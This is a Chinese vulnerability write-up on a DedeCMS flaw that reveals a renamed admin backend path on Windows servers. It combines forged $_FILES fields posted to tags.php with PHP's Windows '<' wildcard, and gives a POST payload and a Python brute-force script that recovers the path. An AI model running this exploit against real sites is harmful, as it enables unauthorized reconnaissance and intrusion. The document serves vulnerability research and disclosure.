# DedeCMS 后台地址泄露漏洞

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 漏洞描述

织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。dedecms 默认后台地址为 /dede，但很多时候可能会被管理员更改，这时，我们就需要先找到后台地址，本漏洞可以泄露出 dedecms 的后台。

## 漏洞影响

仅针对windows系统（这是因为 < 通配符只在 windows 生效），猜测影响全版本

测试版本 DedeCMS V5.7 SP2

## 漏洞分析

### 代码分析

问题出在 include/common.inc.php 的 148 行

```php
if($_FILES)
{
    require_once(DEDEINC.'/uploadsafe.inc.php');
}
```

上传文件时会请求 include/uploadsafe.inc.php

```php
...
$keyarr = array('name', 'type', 'tmp_name', 'size');
...
foreach($_FILES as $_key=>$_value)
{
    foreach($keyarr as $k)
    {
        if(!isset($_FILES[$_key][$k]))
        {
            exit('Request Error!');
        }
    }
    if( preg_match('#^(cfg_|GLOBALS)#', $_key) )
    {
        exit('Request var not allow for uploadsafe!');
    }
    $$_key = $_FILES[$_key]['tmp_name'];
    ${$_key.'_name'} = $_FILES[$_key]['name'];
    ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\./]#i', '', $_FILES[$_key]['type']);
    ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);
    if(!empty(${$_key.'_name'}) && (preg_match("#\.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#\.#", ${$_key.'_name'})) )
    {
        if(!defined('DEDEADMIN'))
        {
            exit('Not Admin Upload filetype not allow !');
        }
    }
    if(empty(${$_key.'_size'}))
    {
        ${$_key.'_size'} = @filesize($$_key);
    }
    
    $imtypes = array
    (
        "image/pjpeg", "image/jpeg", "image/gif", "image/png", 
        "image/xpng", "image/wbmp", "image/bmp"
    );

    if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))
    {
        $image_dd = @getimagesize($$_key);
        //问题就出在此处，获取不到就会报错退出
        if (!is_array($image_dd))
        {
            exit('Upload filetype not allow !');
        }
    }
}
```

首先会解析 `$_FILES` 的值，需要满足 `$_FILES[$key]` 一定要存在数组 `$keyarr`  中的这些键

然后就是不允许 `$key` 等于 cfg_ 或者 GLOBALS，这里防止了一部分的变量覆盖，因为之后就会 `$$key`

接下来就是一些取值，比较简单，然后给了一个文件类型的白名单，必须满足是这些类型，最后来到出问题的位置，获取图片的大小，获取不到就报错，这里的话，由于 `$_FILES` 的值可控，也就是 `$$key` 的值可控，既然文件名可控，那么我们就可以利用这里判断是不是存在某文件，再利用通配符，我们就可以获取到后台的地址 

### PHP在Windows上的一些奇妙特性

这里我们需要了解一下 php 在windows上的一些奇妙特性 [WINDOWS文件通配符分析](https://www.cnblogs.com/wangtanzhi/p/12868197.html)

```
大于号(>)相等于通配符问号(?)
小于号(<)相当于通配符星号(*)
双引号(")相当于点字符(.)
```

首先我们需要知道我们使用了文件操作函数，然后PHP的文件操作函数均调用了opendir

`opendir(win32readdir.c)` 使用了 `windows` 的 `FindFirstFile（API)` ，然后在FindFirstFile（API)中进行了如下的定义：

```
//  The following constants provide addition meta characters to fully
//  support the more obscure aspects of DOS wild card processing.

#define DOS_STAR        (L'<')
#define DOS_QM          (L'>')
#define DOS_DOT         (L'"')
```

于是我们的这三个符号在对php文件操作时就有了特殊含义

我们的这里使用了 getimagesize 函数，刚好他是文件操作，我们我们可以使用通配符 <

很多地方说的都是 < 只通配一个字符，但实际尝试中却是可以通配多个字符

### payload 构造

只要包含了 include/common.inc.php 的文件就可以被利用，没有其他特殊条件，这里我们可以选取 tags.php

在前面的文章中说过，每一个 GET 或者 POST 的参数都会进行如下处理

```php
foreach(Array('_GET','_POST','_COOKIE') as $_request)
{
    foreach($$_request as $_k => $_v)
    {
        if($_k == 'nvarname') ${$_k} = $_v;
        else ${$_k} = _RunMagicQuotes($_v);
    }
}
```

因此，我们的 `$_FILES` 也可以通过这种形式来获取，POST 一个 `_FILES[a][tmp_name]` 就可以实现

这里还有一个简单的绕过

```php
if(!empty(${$_key.'_name'}) && (preg_match("#\.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#\.#", ${$_key.'_name'})) )
{
    if(!defined('DEDEADMIN'))
    {
        exit('Not Admin Upload filetype not allow !');
    }
}
```

我们这里必然是没有定义 DEDEADMIN 的，因此我们需要绕过，最简单的就是

```php
$_FILES[a][name]=''
```

因此我们可以构造 payload

```
_FILES[a][tmp_name]=./de</images/image.gif&_FILES[a][name]=&_FILES[a][type]=image/gif&_FILES[a][size]=10
```

## Exp

如果通配符只匹配一个字符，但刚好有文件夹的第一个字符与后台地址的第一个字符相同，那么将得不到结果，所以最好是先确定两个字符，因为只针对 windows，windows大小写不敏感，所以只需要小写字母+数字就行，图片文件需要是真实存在的

```python
import requests
import string
import re

s = requests.session()

def getData(payload):
    return {
        '_FILES[a][tmp_name]': payload,
        '_FILES[a][name]': '',
        '_FILES[a][type]': 'image/gif',
        '_FILES[a][size]': '10'
    }

def getAdmin(url):
    dic = string.digits + string.ascii_lowercase
    path = ''
    flag = False
    for i in dic:
        if flag:
            break
        for j in dic:
            payload = './' + i + j + '</images/image.gif'
            data = getData(payload)
            html = s.post(url + '/tags.php', data=data).text
            if 'Upload filetype not allow !' not in html:
                path = i + j
                flag = True
                break
    print("[+] " + url + "/" + path)
    while(1):
        for i in dic:
            payload = './' + path + i + '</images/image.gif'
            data = getData(payload)
            html = s.post(url + '/tags.php', data=data).text
            if 'Upload filetype not allow !' not in html:
                path = path + i
                print("[+] " + url + "/" + path)
                break
        if s.get(url + '/' + path + '/images/image.gif').status_code == 200:
            break

if __name__ == '__main__':
    url = 'http://127.0.0.1/dedecms'
    getAdmin(url)

```

## 参考

- https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/

`github` 链接：`https://github.com/N0puple/vulPOC`

获取文中环境可以关注公众号 “安全漏洞复现”，回复 “漏洞环境”